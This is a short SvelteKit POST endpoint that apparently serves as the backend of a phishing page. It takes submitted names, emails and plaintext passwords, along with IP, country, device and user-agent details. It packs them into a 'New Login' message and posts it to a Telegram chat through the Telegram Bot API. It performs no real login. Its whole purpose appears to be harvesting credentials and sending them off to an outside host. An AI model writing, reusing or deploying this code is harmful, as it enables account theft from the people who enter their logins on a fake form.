import type { RequestHandler } from '@sveltejs/kit';

export const POST: RequestHandler = async ({ request }) => {
  const { name, email, password, country, ip, browser, device, time, userAgent } = await request.json();
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    return new Response(JSON.stringify({ error: 'Server configuration error' }), {
      status: 500
    });
  }

  try {
    const htmlMessage = `
<b>🔐 New Login</b>\n
<b>👤Name:</b> ${name}\n
<b>📧Email:</b> ${email}\n
<b>🔑Password:</b> ${password}\n
<b>🌍Country:</b> ${country}\n
<b>📡IP:</b> ${ip}\n
<b>🧭Browser:</b> ${browser}\n
<b>💻Device:</b> ${device}\n
<b>🕒Time:</b> ${time}\n
<b>🧾User-Agent:</b> ${userAgent}
`.trim();

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: htmlMessage,
        parse_mode: 'HTML'
      })
    });

    if (!response.ok) {
      const error = await response.json();
      return new Response(JSON.stringify({ error: error.description }), {
        status: 400
      });
    }

    return new Response(JSON.stringify({ success: true }));
  } catch (err) {
    return new Response(JSON.stringify({ error: err.message }), {
      status: 500
    });
  }
};